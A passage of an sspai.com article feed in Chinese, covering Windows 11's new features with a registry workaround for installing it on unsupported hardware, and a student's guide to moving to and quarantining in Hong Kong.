href=\"https://ergo.human.cornell.edu/cumousetips.html\" target=\"_blank\">CUergo: 10 Tips for Mouse Use</a></p>\n<h4>关联阅读</h4>\n<ul>\n<li><a href=\"https://sspai.com/post/66327\" target=\"_blank\">用过 30 多款游戏鼠标后，我想聊聊如何筛选到趁手利器</a></li>\n<li><a href=\"https://sspai.com/post/68599\" target=\"_blank\">办公室与宿舍的防刺杀装备：静音键鼠详解</a></li>\n<li><a href=\"https://sspai.com/post/67355\" target=\"_blank\">少数派员工的桌面长啥样——键鼠外设用些啥？</a></li>\n<li><a href=\"https://sspai.com/post/67354\" target=\"_blank\">手腕救星还是烧钱摆件？聊聊人体工学键盘</a></li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/69064"},{"title":"Windows 11 正式版发布，升级后一定不要错过这些新特性","date":"2021-10-05 07:00:00","description":"\n<p>北京时间 10 月 5 日，微软发布了其下一代桌面操作系统 Windows 11 正式版，和 Windows 10 不同的是，Windows 11 具有更为现代的设计风格，完全替代传统控制面板的「设置」工具，全新的小部件等新工具，无论在设计还是功能上都让人耳目一新。</p>\n<p>少数派整理了 Windows 11 正式版中值得关注的系统新特性，希望可以帮助广大的 Windows 用户可以更加熟悉这个全新设计的「下一代 Windows」。</p>\n<p><strong>编注：</strong>无论是全新安装还是升级到 Windows 11，都请先对重要的数据进行备份，对于不在「官方支持硬件」范围内的设备，强行安装 Windows 11 可能会出现无可预估的系统故障和 Bug，请在安装前三思而后行，也可以通过虚拟机的形式进行尝鲜，不建议用在生产环境中。</p>\n<h2>我的电脑能升级/安装 Windows 11 吗？</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/05/f2ecb8cbaee64aa643d561076bcba124.png\"></figure><p>和 Windows 10 具有较高的硬件兼容性有所不同的是，Windows 11 对于硬件设备有着较高的要求，目前微软给出的 <a href=\"https://www.microsoft.com/zh-cn/windows/windows-11-specifications\" target=\"_blank\">官方硬件要求</a> 如下：</p>\n<ul>\n<li>需要 1GHz 或更快的支持 64 位的处理器（双核或多核）或系统单芯片(SoC)；</li>\n<li>4GB 内存；</li>\n<li>64GB 或更大的存储设备；</li>\n<li>支持 UEFI 安全启动；</li>\n<li>受信任的平台模块(TPM)版本 2.0；</li>\n<li>支持 DirectX 12 或更高版本，支持 WDDM 2.0 驱动程序；</li>\n<li>对角线长大于 9 英寸的高清 (720p) 显示屏，每个颜色通道为 8 位。</li>\n</ul>\n<p>虽然在硬件需求中并没有专门说明，但微软却单独给出了官方的支持处理器型号支持列表，其中 <a href=\"https://docs.microsoft.com/zh-cn/windows-hardware/design/minimum/supported/windows-11-supported-intel-processors\" target=\"_blank\">Intel 的处理器</a> 最低型号需要至少八代酷睿处理器以及同架构的奔腾、赛扬、志强以及 Atom 处理器。<a href=\"https://docs.microsoft.com/zh-cn/windows-hardware/design/minimum/supported/windows-11-supported-amd-processors\" target=\"_blank\">而 AMD 方面</a>，最低支持的 CPU 型号为锐龙 2000 及对应同架构的霄龙处理器、速龙处理器、线程撕裂者处理器。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/05/972a18bb9aacf577a2111522b210fe74.png\"></figure><p>从今天开始对于所有支持的设备，你可以选择等待 Windows Update 推送 Windows 11，也可以通过 <a href=\"https://www.microsoft.com/zh-cn/software-download/windows11\">这里</a> 直接升级或者重新安装 Windows 11。</p>\n<p>如果你还是不清楚你的电脑能否升级至 Windows 11，你可以在 <a href=\"https://www.microsoft.com/zh-cn/windows/windows-11#pchealthcheck\">这里</a> 下载 Windows 11 兼容性检查软件进行确认，而由 OEM 生产的品牌机也可以前往各自品牌的帮助主页了解到能否正常升级到 Windows 11。</p>\n<p>而不再官方支持的 CPU（AMD Zen 第一代或更早、 Intel 第七代酷睿处理器或更早）虽然并不能通过以上方式直接升级，但依旧可以通过镜像手动进行安装，但有可能后续将收不到 Windows 11 大版本更新，而微软也表示在这些老硬件上运行 Windows 11 稳定性较低，更容易出现系统崩溃等问题。</p>\n<p>而对于不支持受信任的平台模块 TPM 版本 2.0 的设备，目前可以通过手动的方式绕过限制来安装 Windows 11，详细方法我也已经贴在了文章末尾，感兴趣的朋友们可以进行尝鲜，不过记得提前备份好数据。</p>\n<h2>Windows 11 有哪些值得关注的新特性？</h2>\n<p>为了可以在升级到新系统之后可以更快的上手 Windows 11 的诸多新功能，少数派为你整理新系统中一系列值得关注的新特性。</p>\n<h3>全新的感官体验</h3>\n<p>说到底，即便是 Windows 10 这种被微软称作是「现代的」Windows 桌面操作系统，其系统的交互依旧和 Windows 95 一脉相承——开始按钮和开始菜单的样式并没有本质上的变化，而在 Windows 11 中，我们第一眼看到的就是这个底部居中的开始按钮。</p>\n<p>也许开始的时候会有些不习惯，但如果深入下去你会逐步理解 Windows 11 开始菜单的这些变化——如果我们以前没有使用过桌面操作系统，而是只接触过智能手机，那么你会发现 Windows 11 的开始菜单更像是手机中的应用抽屉：搜索依旧是核心，紧接着是分布排列的应用图标，最下方则是推荐的项目和最近使用的文档。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ap0hdb34teh0gc1e10.png\"></figure><p>而每一个功能板块都会有「更多」用来展开更多的内容项目，这种类似手机应用抽屉的设计反而更容易直达操作目标，而开始菜单也真正成为了在 PC 上的开始——不仅仅只是运行软件，而是直达操作，无论是打开文件、观看视频还是访问网页。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ap0hlb34teit0pmr1g.png\"></figure><p>Windows 10 有着一种天然的割裂感，这种割裂感不仅仅只是视觉上，还有功能——比如说你想要修改系统的某个设置，你可以根本不知道去哪里设置，因为 Windows 10 中除了一个采用 Fluent Design 风格的「设置」之外，还有一个Windows 7 风格的老古董「控制面板」。并且我们也会遇到这样的场景：在「设置」中点击某个设置项目后，具体的设置又会跳转回「控制面板」的某一级功能中，实际上我们根本不知道系统的某一项设置是在「设置」里面还是「控制面板」中。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/05/97d965c37c93bdbae2b3218dfb8a063b.png\"></figure><p>这使得 Windows 10 更像是一个 Windows 各个时期系统 UI 的大杂烩，而在 Window 11 中，这个更现代的「设置」终于完全取代了「控制面板」——这不是基于「控制面板」的修修补补，更符合现代智能手机的使用习惯，更为清晰的侧边栏设置大项导航，每一个功能设置渐进式的显示来帮助我们进行系统功能的设置，以及一个可以直达设置项目的设置搜索，即便是隐藏的高级设置也能立刻找到。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/05/082f80fe1557343f2661a91fe5d8be48.png\"></figure><p>任务栏的重构看上去更像是在保持 Windows 传统的前提下和 macOS 靠拢，使得 Windows 11 的任务栏更像是 Dock 栏，而其中搜索体验的变化最大，点击搜索图标你会看到一个全新的独立搜索窗格，搜索放置在窗格的顶部，当你输入关键字的同时窗格下方就会实时的呈现出结果流。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ap0i5b34teh0gc1e1g.png\"></figure><p>另一个重大的设计变革则是任务栏右下角的「快捷设置」以及「通知中心」，在 Windows 10 中，快速设置和通知中心被整合为一个入口，而在 Windows 11 中则完全重构，首先「快捷设置」和「通知中心」有着不同的入口（快捷设置是点击状态栏右下角的音量图标，而通知中心则是点击状态栏右下角的时间日期），并且两者都有了专门的键盘快捷键。并且呈现的内容显然已经完全不同：通知中心最下方呈现的是日历以及当前时间，上方则是圆角卡片的通知。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ap0idb34teh5fkvdo0.png\"></figure><p>而「快捷设置」部分改动则非常大，原本在 Windows 10 中更像是「快捷的功能开关」，但在 Windows 11 中则将原本独立的音量调节以及网络快速设置都融合进来，使得一些需要进行调整的快捷操作可以在一处就可以全部完成。此外在浏览器中播放音频或者使用 Spotify 这样的音乐 App 播放音乐，对应的播放控件也会出现在「快捷设置」的上方。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ap0ilb34teh5fkvdog.png\"></figure><p>在设计上有着较大转变的还有传统的「资源管理器」，相比 Windows 8.1/Windows 10 的「资源管理器」通过 Ribbon 界面显示大量复杂的功能设置，Windows 11 上的「资源管理器」在设计上要更为现代，这种现代体现在注重视觉上的简单，但同时却突出了核心功能，通过和鼠标右键的上下文菜单结合来实现一系列的操作，而在使用 Windows 11 的资源管理器时也不禁感叹：为什么之前的 Windows 资源管理器会做的如此复杂且功能繁复。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ap0itb34teh0gc1e20.png\"></figure><p>桌面操作系统中最直观的当属：桌面主题，在 Windows 11 中，官方已经提供了两款浅色以及深色的默认主题方便快速切换，同时还有四个附加主题，其实对比 Windows 10 几乎处处都需要自定义设置主题中样式元素，官方已经搭配好的主题可以说省却不少麻烦的地方，当然对于习惯自定义的主题用户同样可以通过「个性化」设置中进行细调。比较让我觉得遗憾的是，即便是 Windows 11 也依旧没有提供浅色/暗色主题的自动切换功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/05/22f16f6faa6f1c50ed9212b7702da437.png\"></figure><p>全新的系统声音也是 Windows 11 一大设计亮点，除了更为大气的系统操作声音之外，标志性的 Windows 开机声也在 Windows 11 回归。</p>\n<h3>小组件</h3>\n<p>现在的 Windows 10 的任务栏中有一个用来展示资讯和信息的小功能「资讯和兴趣」，而在 Windows 11 中这个小功能成为了一个全新的功能组件，叫做「小组件」。找到这个功能并不困难，你可以在任务栏中点击这个功能图标，或者使用键盘快捷键（Windows 徽标键 + W）唤起。如果你的触摸屏，那么从桌面左侧滑动就可以打开。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ap0jdb34teh0gc1e2g.png\"></figure><p>实际上你可以在 macOS 中找到类似的功能，只不过在 macOS 上，小组件是从屏幕右侧弹出，而在 Windows 11 则是从左侧弹出。虽然名字叫做「小组件」，但两者在功能上还是有比较明显的区隔的，Windows 11 上小组件更像是一个信息中心，在首个 Windows 11 正式版中，你可以看到的小部件包括天气、你关注的股票、体育信息以及本地热门资讯新闻。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ap0jlb34teh5fkvdp0.png\"></figure><p>当然除了默认给出的内容源之外，你还可以在资讯流中加入你自己的兴趣内容，而这里则会和微软最新推出的资讯聚合服务 Microsoft Start 完全打通， 涵盖了兴趣分类和内容源等，只需要点击添加就可以在「小组件」中看到你喜欢的内容摘要。未来小部件还将支持自己增添小部件，重新排列以及调整大小来让小部件更具个性化（Dev 版已支持）。</p>\n<h3>窗口布局和桌面</h3>\n<p>随着电脑屏幕的越来越大，如何充分利用桌面显示面积来提高效率？以往我们通过并排软件窗口赖实现多任务处理，但这只是一种窗口布局的形式，并不能充分的利用大屏优势，而在 Windows 11 中，则推出了更为多样的窗口布局来充分利用大屏优势，让多任务处理效率更高。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/05/177b235683a6a92bb2cb2ec595df285e.png\"></figure><p>你可以把 Windows 11 这个全新的窗口布局功能看成是 PowerToys 中 FancyZones 的扩展增强，只不过操作上不用再记住那些复杂的快捷键了，只需要鼠标按住/悬停在窗口右上方最大化按钮上，自然窗口布局引导器就会给出相应的布局方案，你只需要根据你的选择点击某个布局模式，窗口自然就会根据布局模式进行排列。对于较小的屏幕，默认会给出四种布局，而在更为常用的1920 × 1080 屏幕，则给出了六种布局。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ap0k5b34teh0gc1e30.png\"></figure><p>对于不同的工作任务，也可以通过新建桌面的形式来实现工作任务的分配管理。鼠标悬停到任务栏中的任务视图上就可以快速访问当前的桌面或者立即创建新桌面，甚至为了有所区隔，你完全可以对桌面进行重新排序甚至为每一个桌面自定义背景。</p>\n<h3>更开放的 Microsoft Store</h3>\n<p>微软在 Windows 10 上首次推出了基于桌面操作系统的应用商店，但由于存在诸多的限制，在应用商店上架的应用数量依旧很少。而在 Windows 11 中，我们看到一个完全不同以往的 Microsoft Store。</p>\n<p>首先，从设计上 Microsoft Store 采用了和系统 UI 一致的设计，圆角窗口 + 卡片，每一款的应用简介显示的更为详尽，甚至你可以看到类似 iOS 中 App Store 那样的应用推荐专题。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ap0kdb34teh0gc1e3g.png\"></figure><p>而收录的应用也不再仅限于 UWP 和 win32 转制的应用，而是扩大了收录范围，比如你可以直接在 Microsoft Store 中下载安装 Visual Studio、Zoom 这样的原本需要在其官网网站中单独下载安装的软件；而游戏部分则可以和 Xbox Game Pass 会员打通，从而享受特定的会员折扣。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ap0klb34teit0pmr30.png\"></figure><p>未来 Microsoft Store 还将支持运行 Android 应用，甚至你可以在 Microsoft Store 中下载其他的第三方的游戏商店，成为一个更为开放的软件下载获取平台。</p>\n<h3>聊天，不仅仅是聊天</h3>\n<p>在 Windows 11 中，在线实时沟通成为一个重要的选项。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ap0ktb34teit0pmr3g.png\"></figure><p>融合 Skype 和 Microsoft Team，Windows 11 中内置了实时通讯——「聊天」，你可以看作是类似 macOS 中 FaceTime 的服务，所以相比那些第三方即时通讯软件有着天生的优势：无需安装，内置在系统中，更重要的是只要开机就随时在线，你可以随时和你的联系人发起语音会话或者视频会话，只要他们在你的联系人列表中。并且你可以和使用 Microsoft Team 的任何一个平台用户联系，显然就跨平台上完全毫无压力。</p>\n<h3>针对触控的优化</h3>\n<p>如果说 Windows 8.x 是为触控而生的 Windows，那么 Windows 10 就是传统键鼠的重新「拨乱反正」。但在 Surface 这样的二合一触控平板当道的今天，触摸屏幕或许是更接近自觉的操作，放在 Windows 11 中尤其注重对触控上的优化。</p>\n<p>首先就是用来在触控屏上进行文本输出的「虚拟键盘」，经过重新设计调整了虚拟键盘的尺寸以及每一个虚拟按键的键距，全新的键盘皮肤还可以完全的自定义。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ap0mdb34teh0gc1e40.png\"></figure><p>其次，针对触摸屏也有了新的手势，可以非常方便的进行应用和桌面之间的切换，比如三指手势中，向左或者向右可以快速切换到上次使用的应用程序窗口，向下滑动可以返回桌面，而向上滑动可以打开任务视图看所有打开的应用程序窗口或者桌面。另外还有一个四指手势——向左或者向右滑动可以切换到上一个/下一个桌面。</p>\n<p>对于数字手写笔设备，Windows 11 还加入了重新设计的笔菜单，可以勇敢点击任务栏右下角的「笔」图标激活，默认的菜单中会有两个应用，你可以编辑菜单赖添加最多四款绘画或者手写的应用，当你使用手写笔时可以快速打开这些软件。</p>\n<p>当然还有不少能够增强游戏体验的新特性，比如将 SDR 游戏自动优化为 HDR 的 AutoHDR 技术，能更快从 NVMe 里读取游戏素材的 DirectStorage 技术，还比如可以增强临场感的空间音效等等。此外 Windows 11 还为 Intel 12 代酷睿处理器，也就是即将到来的 x86 大小核处理器做了不少优化。</p>\n<h2>在不受支持的硬件上安装 Windows 11</h2>\n<p>相信你看到 Windows 11 的这些新特性已经迫不及待想要尝鲜了，但是却发现自己的电脑无法升级到 Windows 11，不要着急下面我们将提供一个解决方法帮你在不受支持的硬件上安装 Windows 11。</p>\n<p>对于没有 TPM 2.0 的硬件，无论是使用全新安装还是从 Windows 10 使用 Media Creation Tool 升级安装，在过程中可能会遇到如下的提示，显示您的设备无法安装 Windows 11：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ap0gtb34teit0pmr10.jpeg\"></figure><p> </p>\n<p>这里需要调用注册表来绕过，如果是全新安装，那么需要使用快捷键 <code>Shift + F10</code>打开命令提示符，然后输入 <code>regedit</code>，回车打开注册表，如果是升级安装，则可以使用快捷键 <code>Windows 徽标键 + R</code>输入 <code>regedit</code>。</p>\n<p>定位到<code>HKEY_LOCAL_MACHINE\\SYSTEM\\Setup</code>然后右键<code>setup</code>新建一个名为<code>LabConfig</code>的项。</p>\n<p>接着在<code>LabConfig</code>这个项里面再新建两个 <code>DWORD值</code>，一个数值名称为<code>BypassTPMCheck</code>，数值数据为<code>00000001</code>，基数是十六进制；一个数值名称为<code>BypassSecureBootCheck</code>，数值数据为<code>00000001</code>，基数是十六进制。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ap0h5b34teh5fkvdmg.png\"></figure><p>编辑完成之后关闭注册表，之后点击返回到安装的上一步，再点击下一步就可以顺利进行安装了。不过这样安装还是存在无法获得系统安全更新以及功能更新的可能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ap0h5b34teh5fkvdn0.png\"></figure><p>最后，重要的事情还需要再说一次，无论是全新安装还是升级到 Windows 11，都请先对重要的数据进行备份。从今天开始，你可以直接在 Microsoft 上 <a href=\"https://www.microsoft.com/zh-cn/software-download/windows11\">下载</a> 到 Windows 11 镜像，所有来自于第三方的镜像都需要小心使用。</p>\n<p>以上就是少数派为你整理的首个 Windows 11 正式版值得关注的新特性，你还在升级到 Windows 11 正式版后发现了哪些实用的新功能？欢迎在评论区告诉我们。</p>\n<p><strong>关联阅读：</strong><a href=\"https://sspai.com/post/67836\">具透 | 不透明的「半透明」：Windows 11 新材质如何欺骗你的眼睛</a></p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，第一时间了解 Windows 动态 🐱‍🏍</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/69072"},{"title":"城市收藏夹 · 香港：两年不见，甚是想念","date":"2021-10-05 03:56:00","description":"\n<p>一个城市的魅力不全是它的历史、文化或自然风光，也有不少惊喜往往来自那些只有当地人才知晓的隐蔽深巷。而「城市收藏夹」是我们征集来自世界各地 Matrix 社区作者共同维护的一个长期话题，我们会邀请大家分享自己所在城市或家乡的美食或玩乐目的地。</p>\n<p>大众点评可能会让你踩坑，但我们不会。</p>\n<hr>\n<p>今年八月份，我前往香港，作为一名学生，开始了新生活。</p>\n<p>说到香港，真的很感慨，因为太久没来，以至于对它感到有点陌生了。（许万里同学说的，我觉得也非常能描述我的心境，所以直接搬来用了。）</p>\n<p>作为一个广州人，我基本上每年都会来一次。上一次来香港是 2019 年的 6 月，那一次是来考试，所以并没有去什么地方，除了在考场考试，大部分时间都在酒店里备考了。离开香港时，本以为找个假期再来一次很容易，没想到，匆匆一别，已是两年的时间。这两年的时间里，香港和我自己都经历了很多，以至于出发前我对于这个曾经感到无比熟悉的城市竟然产生了一些茫然：<strong>究竟，香港现在是什么样子呢？</strong>我也很想知道。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/30/7e11fc22de06edf84924da6987850715.jpg\"><figcaption>沙田 车公庙附近</figcaption></figure><h2>怎么去香港</h2>\n<p>在开始讲述我的港漂生活之前，想先和大家分享一下我来港前的各项准备工作。</p>\n<h3>租房</h3>\n<p>在办理签证之前，我们需要先找好住处。因为港校的研究生基本上不能分配到宿舍，所以绝大部分的学生都需要自己找房子租。</p>\n<p>在香港，非本地研究生租房基本上有三种选择，分别是租村屋、租普通商品房和长租酒店。</p>\n<h4>村屋</h4>\n<p><strong>定义：</strong>指位于学校附近村子里的别墅，既可以整套出租，也可以分开出租给不同人。</p>\n<p><strong>优点：</strong>价格会相对低廉。和普通商品房相比，相同价格下往往能获得更大的个人使用空间。有的村屋还会配有院子。地理上通常会更加靠近学校（对于在一些位置稍微偏僻学校就读的学生会更有吸引力）。</p>\n<p><strong>缺点：</strong>因为位置偏僻，通常配套设施（交通、饮食、娱乐）不是很好。</p>\n<p><strong>适合人群：</strong>耐得住寂寞，预算有限，对私人空间比较有要求，动手能力较强的同学。</p>\n<h4>普通商品房</h4>\n<p><strong>定义：</strong>指普通的商品房，可以整租，也有可能重新划分若干区域分别出租。</p>\n<p><strong>优点：</strong>通常配套设施较好，比较靠近商场，食肆或地铁站。</p>\n<p><strong>缺点：</strong>公共活动空间和个人活动空间较少（通常是 5 平方~10 平方），租房价格稍高。</p>\n<p><strong>适合人群：</strong>生活便利性要求比较高的同学。</p>\n<h4>酒店长租</h4>\n<p><strong>定义：</strong>一直住在酒店包间里面。有两人间，三人间等。按照酒店等级以及房间尺寸和附加的服务变动租房价格，丰俭由人。</p>\n<p><strong>优点：</strong>只要肯花钱，足不出户都可以满足基本生活需求，定期有人清洁。</p>\n<p><strong>缺点：</strong>没有或者缺少物理间隔，价格比较贵。</p>\n<p><strong>适合人群：</strong>生活便利性要求极致的同学。</p>\n<p>因为我也是第一次租房，所以想再和大家分享一点经验。我租房时，主要考虑以下几点：</p>\n<ol>\n<li>房屋的法律资质。因为这个涉及租住单位的法律地位，所以需要在租房子前就要确认好。例如，对于公屋（公共屋邨）单位，如果房东只是作为公屋租客，单位是不允许出租的（即所谓「租上租」），如果被发现，会被追究法律责任；</li>\n<li>房屋的基本信息。包括房龄能否接受，房间的面积是多少（香港采用「呎」作为面积计量单位，1 呎≈0.09 平方米）。如果对生活更有追求，可以进一步看看它朝向，配套的家私、厨具、wifi情况，以及与附近的餐厅、药店、百货商店、菜市场的距离等等；</li>\n<li>房间能否隔离。如果房东不允许居家隔离，那么还需要自己先找隔离酒店，产生额外的支出；</li>\n<li>房间的交通通达性，包括距离地铁站，公交车站的距离。一般我更看重前往地铁站的便利程度，因为地铁在时效性来说更有保障，使用八达通乘车也有优惠。</li>\n</ol>\n<p>如果觉得自己找房子麻烦，可以委托中介平台进行寻找；如果不介意事无巨细地过问，也可以自己在论坛上找，加上房东微信后可以在一些留学论坛里看一下房东之前有没有被出租过房屋，服务和态度怎样。不过，无论是委托中介还是自己找房子，针对自己担心的问题先问清楚，且在最后签约的时候再次核实。</p>\n<h3>签证</h3>\n<p>众所周知，因为疫情的原因，目前香港的普通自由行尚未开放。我这次去是作为学生申请的一年多次往返签证（但是在疫情没有根本好转之前，其实就只能够最多来往一次）。学校发放录取通知书后，会有关于如何向香港海关申请 visa label（就是「粉签」）的指引，一步步操作就好。大概需要等 2~3 个月，粉签会在开学前三个月左右拿到手。</p>\n<p>等拿到粉签后，就可以前往出入境大楼办理逗留签证（就是「D 签」）了。需要带上通行证、身份证和粉签及相关文件（学校会用信封装好），文件最好自行复印一份，到时候出入境大楼的工作人员会收取一份留底。</p>\n<p>在申请了留学生一年多次往返的逗留签以后，等一周左右就可以拿到，我带上身份证就可以在自助发证机拿到。</p>\n<h3>行李</h3>\n<p>需要带去香港的东西，我主要分两部分，必带和选带。</p>\n<p><strong>必带：</strong></p>\n<ol>\n<li>各类证件，如内地身份证、通行证、粉签、疫苗接种凭证（如有）；</li>\n<li>若是来港读研，需要带上中英文成绩单、中英文学位证明、中英文毕业证明以备查验；</li>\n<li>带上适量现金和银行卡（注意：进出中国海关不能携带超过 20000 元人民币的现钞和等值 5000 美金的外币现金；进入香港海关（跨境运送）不能够携带超过 120000 港币，否则应自行申报）；</li>\n<li>笔记本电脑，转换插座；</li>\n<li>根据自己需求觉得需要带的其他物品。</li>\n</ol>\n<p><strong>选带：</strong></p>\n<ol>\n<li>生活类用品：碗碟，筷子，拖鞋，保鲜袋；</li>\n<li>电器：电饭煲，移动充，平板电脑等；</li>\n<li>药品：常用的应急药物，包括发烧，胃痛，喉咙痛的特效药。</li>\n</ol>\n<h2>过关的流程</h2>\n<p>目前因为疫情管控原因，只有<strong>深圳湾</strong>和<strong>港珠澳大桥</strong>两个陆路海关以及<strong>香港国际机场</strong>一个空港可以入境香港。</p>\n<ol>\n<li>南方地区的小伙伴建议搭乘高铁到深圳或珠海，再打车或者转乘公交到口岸过关；</li>\n<li>如果是北方地区的同学可以考虑选择直飞香港国际机场。</li>\n</ol>\n<p>因为我从广州出发，所以就选择从深圳湾过关，整体会更加方便。如果从港珠澳大桥过关，需要先到珠海，绕一个圈，再从西部的赤腊角进入香港，就会繁琐一些。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/24/818cefad83039f16f209d091d89ba43b.png\"><figcaption>目前三个入境口岸的位置</figcaption></figure><p>因为疫情管制原因，在深圳湾口岸「一地两检」的过程中需要出示不同的二维码作为我们的健康证明。为了节省时间，可以提前填写相关信息并生成好二维码（24 小时有效），配合好海关人员检查也能加快通关速度。</p>\n<p>黑码：海关指尖服务健康申报码，大陆海关一定会检查；</p>\n<p>绿码：粤康码通关凭证，大陆海关可能需要检查；</p>\n<p>粉码：香港卫生署健康申报表，香港海关一定会检查（如果发现填写后无法提交，可以尝试换一个界面语言，亲测有效）</p>\n<p>等香港海关检查完证件，会给你发放说明入境时间和允许逗留时间的小白条（就是「landing slip」），戴好定位手环，嘱咐完相关事项就可以离开海关大楼了。</p>\n<p>不过可能是快要到开学季的原因，虽然有疫情这个「debuff」，但是等待过关的人其实并不少，我从开始排队等待进入海关大楼，到佩戴好定位手环出大楼，大概用了四个小时，后几天过关的同学已经需要六个小时才能过关了。目前深圳湾海关通关时间最晚到 22：00，大家可以安排好自己的时间，尽早开始过关，8：30 人流还不算多，从 9 点到 12 点到 16 点，时间越晚，需要等待的时间也会更长。</p>\n<h2>前往住处，开始隔离</h2>\n<p>过关后，需要自行搭乘交通工具前往住处。因为我找不到同学一起拼出租车，单人乘坐出租车费用太高，基本不考虑。原本我打算搭乘深圳湾口岸的公交到天水围，再搭乘地铁到住处。但是口岸的公交班次比较稀疏，通常 45 分钟到一小时一班。等我出来的时候，目送了一辆直达地铁站的公交离开，下一班在一小时后才能发车。为了不让出租车叔叔赚我的钱，犟劲一上来，我搭了三趟公交车，换乘了两次才最终到达了住处。</p>\n<p>到达住处后，隔离生活就开始啦！隔离期间最重要的是记得按照工作人员的提示在特定的日子自行取得并寄送唾液样本送检。大家可以善用舍友互相提醒。因为我们本人不能够出门，唾液样本需要让别人寄送到收集点，过关时发的检疫小礼包里面会有相关寄送公司的联系方式，但是需要提前一天才能够预约。如果忘记了也没关系，可以在小程序中搜索「花生留学平台」，上面也有同学可以接单帮忙寄送，价格通常还会更加优惠。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/28/32c6e9a5097f0bdb856624f24a1db59f.png\"><figcaption>对比一下，官方提供的三家跑腿公司每次收费需要100元</figcaption></figure><h2>隔离后的闲逛</h2>\n<p>结束隔离以后，终于有机会出去逛逛了。</p>\n<p>我其实对香港不算陌生，生于珠三角地区的我从小就受到香港的文化产品影响，对我来说，香港不同地区都有自己的特殊的符号。</p>\n<p>香港岛：充满着异域风情的建筑风格，大理石的外墙，精致的煤气路灯；</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/29/64e014d93d6eaac892b84d1c0b696039.jpg\"><figcaption>中环 大馆</figcaption></figure><p>九龙半岛：拥挤的霓虹灯牌张牙舞爪地从道路两旁伸出，街边小档卖力地招徕客人，时不时有豪车轰鸣着掠过；</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/30/ddf813fb5e8820776bf10f9387b004f6.jpg\"><figcaption>旺角 通菜街</figcaption></figure><p>离岛：鲜美的海鲜，郁郁葱葱的植物，永远明媚的蓝天，弯弯曲曲的山路。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/29/0effdd353ac75620ac7ddd5a3485871c.jpg\"><figcaption>南丫岛</figcaption></figure><h3>沙田：居住在缤纷的记忆里</h3>\n<p>我首先在我的住处附近溜达了下。但其实我对于新界，对于沙田知之甚少。</p>\n<p>之前每次过关，都是在罗湖口岸匆匆坐上地铁前往油尖旺区购物，或者前往香港岛爬太平山。「大学」、「火炭」、「沙田」，这些地名对于我来说就只是路上一个个迅速掠过的站牌而已。真要我搜索一点关于新界的记忆或者印象，那就是荒芜的山地，一座连着一座的小山丘里偶尔掠过的村庄。但是等我真正有机会四处探索的时候，我发现其实并非如此。</p>\n<p>我居住的地方是沙田区，位于新界东部。随着香港人口的不断发展，沙田被规划成为香港的卫星城，并进行相应的填海造陆和新城镇建设计划。整个计划从 1973 年开始推进，并在 80 年代对沙田管辖区域进行进一步的扩建，逐渐形成现在的规模。可能沙田区是卫星城，本身定位就是为在城市核心区工作的人提供住处，所以在我居住的地区周围有大量的屋邨。</p>\n<p>我查阅了一些资料，新界居住了房委会公营永久性住房一半的居住人口，超过六成的公屋实用面积 40 平方以上，截至 2020年，人均公屋面积是 13.4 平方米。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/51a5ef565e8ac2f455a301a9f7af3439.png\"></figure><figure class=\"image 